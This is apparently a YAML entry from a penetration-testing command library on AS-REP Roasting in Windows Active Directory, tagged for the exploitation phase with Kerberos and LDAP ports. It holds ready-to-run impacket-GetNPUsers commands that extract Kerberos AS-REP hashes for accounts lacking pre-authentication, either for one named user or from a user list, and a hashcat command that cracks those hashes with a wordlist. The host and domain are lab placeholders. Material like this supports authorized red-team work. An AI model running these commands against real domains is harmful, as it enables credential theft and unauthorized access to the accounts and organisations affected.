---
description: |
  Perform AS-REP Roasting — extract AS-REP hashes for accounts that
  do not require Kerberos pre-authentication.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: john
command: |
  # With a known username
  impacket-GetNPUsers test.local/john -dc-ip 10.10.10.1 -no-pass -format hashcat -outputfile asrep.txt

  # With a username list
  impacket-GetNPUsers test.local/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

  # Crack with hashcat
  hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
ports:
  - "88"
  - "389"
items:
  - Username
techniques:
  - AS-REP_Roasting
network_position:
  - Internal
references:
  - https://github.com/fortra/impacket
---
